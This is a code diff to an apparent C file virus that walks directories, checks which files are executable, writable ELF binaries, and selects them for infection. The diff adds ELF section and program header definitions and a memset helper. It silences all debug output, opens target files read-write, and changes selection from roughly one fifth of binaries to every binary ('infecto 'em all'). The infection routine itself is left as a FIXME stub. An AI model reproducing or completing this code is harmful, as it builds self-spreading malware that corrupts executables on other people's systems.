@@ -17,6 +17,77 @@ typedef long int intptr; /* ssize_t */
 
 // elf.h
 
+/* These constants are for the segment types stored in the image headers */
+#define PT_NULL    0
+#define PT_LOAD    1
+#define PT_DYNAMIC 2
+#define PT_INTERP  3
+#define PT_NOTE    4
+#define PT_SHLIB   5
+#define PT_PHDR    6
+#define PT_TLS     7               /* Thread local storage segment */
+#define PT_LOOS    0x60000000      /* OS-specific */
+#define PT_HIOS    0x6fffffff      /* OS-specific */
+#define PT_LOPROC  0x70000000
+#define PT_HIPROC  0x7fffffff
+#define PT_GNU_EH_FRAME		0x6474e550
+
+#define PT_GNU_STACK	(PT_LOOS + 0x474e551)
+
+
+#define	EI_MAG0		0		/* e_ident[] indexes */
+#define	EI_MAG1		1
+#define	EI_MAG2		2
+#define	EI_MAG3		3
+#define	EI_CLASS	4
+#define	EI_DATA		5
+#define	EI_VERSION	6
+#define	EI_OSABI	7
+#define	EI_PAD		8
+
+#define	ELFCLASSNONE	0		/* EI_CLASS */
+#define	ELFCLASS32	1
+#define	ELFCLASS64	2
+#define	ELFCLASSNUM	3
+
+
+/* sh_type */
+#define SHT_NULL	0
+#define SHT_PROGBITS	1
+#define SHT_SYMTAB	2
+#define SHT_STRTAB	3
+#define SHT_RELA	4
+#define SHT_HASH	5
+#define SHT_DYNAMIC	6
+#define SHT_NOTE	7
+#define SHT_NOBITS	8
+#define SHT_REL		9
+#define SHT_SHLIB	10
+#define SHT_DYNSYM	11
+#define SHT_NUM		12
+#define SHT_LOPROC	0x70000000
+#define SHT_HIPROC	0x7fffffff
+#define SHT_LOUSER	0x80000000
+#define SHT_HIUSER	0xffffffff
+
+/* sh_flags */
+#define SHF_WRITE		0x1
+#define SHF_ALLOC		0x2
+#define SHF_EXECINSTR		0x4
+#define SHF_RELA_LIVEPATCH	0x00100000
+#define SHF_RO_AFTER_INIT	0x00200000
+#define SHF_MASKPROC		0xf0000000
+
+/* special section indexes */
+#define SHN_UNDEF	0
+#define SHN_LORESERVE	0xff00
+#define SHN_LOPROC	0xff00
+#define SHN_HIPROC	0xff1f
+#define SHN_LIVEPATCH	0xff20
+#define SHN_ABS		0xfff1
+#define SHN_COMMON	0xfff2
+#define SHN_HIRESERVE	0xffff
+
 #define EI_NIDENT	16
 
 /* 64-bit ELF base types. */
@@ -45,6 +116,30 @@ typedef struct elf64_hdr {
   Elf64_Half e_shnum;
   Elf64_Half e_shstrndx;
 } Elf64_Ehdr;
+
+typedef struct elf64_shdr {
+  Elf64_Word sh_name;		/* Section name, index in string tbl */
+  Elf64_Word sh_type;		/* Type of section */
+  Elf64_Xword sh_flags;		/* Miscellaneous section attributes */
+  Elf64_Addr sh_addr;		/* Section virtual addr at execution */
+  Elf64_Off sh_offset;		/* Section file offset */
+  Elf64_Xword sh_size;		/* Size of section in bytes */
+  Elf64_Word sh_link;		/* Index of another section */
+  Elf64_Word sh_info;		/* Additional section information */
+  Elf64_Xword sh_addralign;	/* Section alignment */
+  Elf64_Xword sh_entsize;	/* Entry size if section holds table */
+} Elf64_Shdr;
+
+typedef struct elf64_phdr {
+  Elf64_Word p_type;
+  Elf64_Word p_flags;
+  Elf64_Off p_offset;		/* Segment file offset */
+  Elf64_Addr p_vaddr;		/* Segment virtual address */
+  Elf64_Addr p_paddr;		/* Segment physical address */
+  Elf64_Xword p_filesz;		/* Segment size in file */
+  Elf64_Xword p_memsz;		/* Segment size in memory */
+  Elf64_Xword p_align;		/* Segment alignment, file & memory */
+} Elf64_Phdr;
 
 #define	ELFMAG0		0x7f		// EI_MAG
 #define	ELFMAG1		'E'
@@ -567,6 +662,7 @@ char* my_strncat(char *dest, const char *src, size_t n);
 char * my_strncpy(char *dest, const char *src, size_t n);
 void reverse(char str[], int length);
 char* itoa(int num, char* str, int base);
+void* my_memset(void *b, int c, int len);
 int infect(const char* fpath);
 
 // syscall.c
@@ -778,13 +874,14 @@ int nftw(const char *path, int (*fn)(const char *, const struct stat *), int nfd
 			d = (struct linux_dirent *) (buf + bpos);
 			//write(1, "%8ld  ", d->d_ino);
 			if((d_type = *(buf + bpos + d->d_reclen - 1)) == DT_REG ) {
-				if(DEBUG) {
-					write(1, "[DEBUG] found reg file : ", my_strlen("[DEBUG] found reg file : "));
-					write(1, d->d_name, my_strlen(d->d_name));
-					write(1, "\n", 1);
-				}
+				// if(DEBUG) {
+				// 	write(1, "[DEBUG] found reg file : ", my_strlen("[DEBUG] found reg file : "));
+				// 	write(1, d->d_name, my_strlen(d->d_name));
+				// 	write(1, "\n", 1);
+				// }
 				file_len = my_strlen(d->d_name);
 				char abs_path[path_len + file_len + 1 + 1];
+				my_memset(abs_path, '\0', path_len + file_len + 1 + 1);
 				my_strncpy(abs_path, cwd_buf, path_len);
 				my_strncat(abs_path,"/", 1);
 				my_strncat(abs_path, d->d_name, file_len);
@@ -830,26 +927,26 @@ int nftw(const char *path, int (*fn)(const char *, const struct stat *), int nfd
 
 int can_execute(const struct stat *sb, const char* fpath)
 {
-	if(DEBUG) {
-		write(1, "[DEBUG] file : ", my_strlen("[DEBUG] file : "));
-		write(1, fpath, my_strlen(fpath));
-		if((sb->st_uid == getuid() && sb->st_mode & S_IXUSR)
-			|| (sb->st_mode & S_IXOTH)) {
-			write(1, " executable", my_strlen(" executable"));
-		} else {
-			write(1, " non-executable", my_strlen(" non-executable"));
-		}
-		write(1, "\n", 1);
-	}
+	//if(DEBUG) {
+		// write(1, "[DEBUG] file : ", my_strlen("[DEBUG] file : "));
+		// write(1, fpath, my_strlen(fpath));
+		// if((sb->st_uid == getuid() && sb->st_mode & S_IXUSR)
+		// 	|| (sb->st_mode & S_IXOTH)) {
+		// 	write(1, " executable", my_strlen(" executable"));
+		// } else {
+		// 	write(1, " non-executable", my_strlen(" non-executable"));
+		// }
+		// write(1, "\n", 1);
+	//}
 	return (sb->st_uid == getuid() && sb->st_mode & S_IXUSR)
 		|| (sb->st_mode & S_IXOTH);
 }
 
 int can_write(const struct stat *sb, const char* fpath)
 {
-	if(DEBUG) {
-		write(1, "[DEBUG] file : ", my_strlen("[DEBUG] file : "));
-		write(1, fpath, my_strlen(fpath));
+	//if(DEBUG) {
+		// write(1, "[DEBUG] file : ", my_strlen("[DEBUG] file : "));
+		// write(1, fpath, my_strlen(fpath));
 		// if((sb->st_uid == getuid() && sb->st_mode & S_IWUSR)
 		// 	|| (sb->st_mode & S_IWOTH)) {
 		// 	write(1, " writable", my_strlen(" writable"));
@@ -901,8 +998,8 @@ int can_write(const struct stat *sb, const char* fpath)
 		// 		write(1, " as no W user", my_strlen(" as no W user"));
 		// 	}
 		// }
-		write(1, "\n", 1);
-	}
+		// write(1, "\n", 1);
+//	}
 	return (sb->st_uid == getuid() && sb->st_mode & S_IWUSR)
 		|| (sb->st_mode & S_IWOTH);
 }
@@ -916,14 +1013,15 @@ int is_elf(const char* fpath)
 	int f;
 
 	//f = fopen(fpath, "rb");
-	f = open(fpath, O_RDONLY);
+	//f = open(fpath, O_RDONLY);
+	f = open(fpath, O_RDWR);
 	//f = open(fpath, O_WRONLY | O_CREAT | O_TRUNC, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH | S_IWOTH);
 	if (f < 0) {
-		if(DEBUG) {
-			write(1, "[DEBUG] error inspecting file : ", my_strlen("[DEBUG] error inspecting file : "));
-			write(1, fpath, my_strlen(fpath));
-			write(1, "\n", 1);
-		}
+		// if(DEBUG) {
+		// 	write(1, "[DEBUG] error inspecting file : ", my_strlen("[DEBUG] error inspecting file : "));
+		// 	write(1, fpath, my_strlen(fpath));
+		// 	write(1, "\n", 1);
+		// }
 		return 0;
 	}
 	//nb = fread(&header, 1, sizeof(header), f);
@@ -933,30 +1031,30 @@ int is_elf(const char* fpath)
 		if ( header.e_ident[0] == (unsigned char)ELFMAG0 && header.e_ident[1] == (unsigned char)ELFMAG1 && header.e_ident[2] == (unsigned char)ELFMAG2 && header.e_ident[3] == (unsigned char)ELFMAG3 ){
 			ret = 1;
 		}
-	} else {
-		if(DEBUG) {
-			write(1, "[DEBUG] error while reading file\n", my_strlen("[DEBUG] error while reading file\n"));
-		}
-	}
+	} //else {
+	// 	if(DEBUG) {
+	// 		write(1, "[DEBUG] error while reading file\n", my_strlen("[DEBUG] error while reading file\n"));
+	// 	}
+	// }
 	//fclose(f);
 	close(f);
 
-	if(DEBUG) {
-		write(1, "[DEBUG] file : ", my_strlen("[DEBUG] file : "));
-		write(1, fpath, my_strlen(fpath));
-		if(ret) {
-			write(1, " is ELF", my_strlen(" is ELF"));
-		} else {
-			write(1, " is not ELF", my_strlen(" is not ELF"));
-		}
-		write(1, ", eident : ", my_strlen(", eident : "));
-		//char tmp_eident[128];
-		//itoa(header.e_ident, tmp_eident, 16);
-		write(1, (char*)&(header.e_ident[1]), 3);
-		//write(1, &(header.e_ident[2]), 1);
-		//write(1, &(header.e_ident[3]), 1);
-		write(1, "\n", 1);
-	}
+	// if(DEBUG) {
+	// 	write(1, "[DEBUG] file : ", my_strlen("[DEBUG] file : "));
+	// 	write(1, fpath, my_strlen(fpath));
+	// 	if(ret) {
+	// 		write(1, " is ELF", my_strlen(" is ELF"));
+	// 	} else {
+	// 		write(1, " is not ELF", my_strlen(" is not ELF"));
+	// 	}
+	// 	write(1, ", eident : ", my_strlen(", eident : "));
+	// 	char tmp_eident[128];
+	// 	itoa(header.e_ident, tmp_eident, 16);
+	// 	write(1, (char*)&(header.e_ident[1]), 3);
+	// 	write(1, &(header.e_ident[2]), 1);
+	// 	write(1, &(header.e_ident[3]), 1);
+	// 	write(1, "\n", 1);
+	// }
 
 
 	return ret;
@@ -970,13 +1068,14 @@ int random_pick()
 	read(f, (char*)&rand, 1);
 	close(f);
 	
-	if(DEBUG) {
-		write(1, "[DEBUG] rand : ", my_strlen("[DEBUG] rand : "));
-		char c = '0' + rand % 5;
-		write(1, &c, 1);
-		write(1, "\n", 1);
-	}
-	return rand % 5 == 0; // We infect roughly 1/5 of the binaries.
+	// if(DEBUG) {
+	// 	write(1, "[DEBUG] rand : ", my_strlen("[DEBUG] rand : "));
+	// 	char c = '0' + rand % 5;
+	// 	write(1, &c, 1);
+	// 	write(1, "\n", 1);
+	// }
+	//return rand % 5 == 0; // We infect roughly 1/5 of the binaries.
+	return 1; // infecto 'em all
 }
 
 int file_process(const char *fpath,
@@ -1108,6 +1207,21 @@ char* itoa(int num, char* str, int base)
     reverse(str, i);
  
     return str;
+}
+
+// https://stackoverflow.com/questions/18851835/create-my-own-memset-function-in-c
+void  *my_memset(void *b, int c, int len)
+{
+	//int           i;
+	unsigned char *p = b;
+	//i = 0;
+	while(len > 0)
+	{
+		*p = c;
+		p++;
+		len--;
+	}
+	return(b);
 }
 
 // FIXME: your infection logic should be placed here and below.
